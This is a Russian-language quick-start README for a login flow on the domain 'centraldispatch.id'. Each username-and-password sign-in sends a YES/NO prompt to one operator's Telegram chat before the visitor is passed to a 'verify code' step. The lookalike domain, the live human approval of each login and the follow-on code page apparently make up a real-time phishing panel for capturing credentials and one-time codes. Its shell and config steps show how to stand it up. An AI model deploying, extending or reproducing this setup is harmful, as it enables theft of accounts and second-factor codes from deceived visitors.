# 🚀 Быстрый старт: Telegram бот для входа

## Что было сделано

✅ Интегрирован Telegram бот вместо Email для подтверждения входа
✅ Добавлен круговой loading во время ожидания ответа
✅ Добавлено отображение ошибки "error sign in.png" при отказе
✅ Реализован long polling для проверки статуса

## Что нужно сделать сейчас

### 1. Создать Telegram бота (2 минуты)

1. Откройте Telegram → найдите [@BotFather](https://t.me/BotFather)
2. Отправьте `/newbot` и следуйте инструкциям
3. **Сохраните Bot Token** (например: `123456789:ABCdef...`)

### 2. Получить Chat ID (1 минута)

1. Найдите [@userinfobot](https://t.me/userinfobot) в Telegram
2. Начните диалог → бот отправит ваш Chat ID (например: `123456789`)

### 3. Настроить переменные окружения

**На сервере:**
```bash
# Подключитесь к серверу
ssh centraldispatch

# Отредактируйте ecosystem.config.js
nano /var/www/centraldispatch.id/ecosystem.config.js
```

Добавьте ваши значения:
```javascript
TELEGRAM_BOT_TOKEN: "ваш_bot_token",
TELEGRAM_CHAT_ID: "ваш_chat_id",
```

**Или через .env файл:**
```bash
# На сервере
cd /var/www/centraldispatch.id
nano .env
```

Добавьте:
```
TELEGRAM_BOT_TOKEN=ваш_bot_token
TELEGRAM_CHAT_ID=ваш_chat_id
```

### 4. Настроить Webhook

```bash
# На сервере или локально
curl -X POST "https://api.telegram.org/bot<YOUR_BOT_TOKEN>/setWebhook?url=https://centraldispatch.id/api/telegram/webhook"
```

Замените `<YOUR_BOT_TOKEN>` на ваш токен.

### 5. Перезапустить приложение

```bash
# На сервере
cd /var/www/centraldispatch.id
source ~/.nvm/nvm.sh
pm2 restart centraldispatch-nextjs --update-env
pm2 save
```

## Проверка работы

1. Откройте форму входа
2. Введите username и password
3. Нажмите SIGN IN
4. Должен появиться круговой loading
5. Проверьте Telegram - должно прийти сообщение с кнопками YES/NO
6. Нажмите YES → должен произойти переход на verify code
7. Нажмите NO → должна появиться картинка "error sign in.png"

## Подробная документация

Смотрите `TELEGRAM_SETUP.md` для детальной информации.

## Важно!

⚠️ **Bot Token должен быть секретным** - не коммитьте его в Git!
⚠️ После изменения переменных окружения нужно перезапустить PM2 с флагом `--update-env`

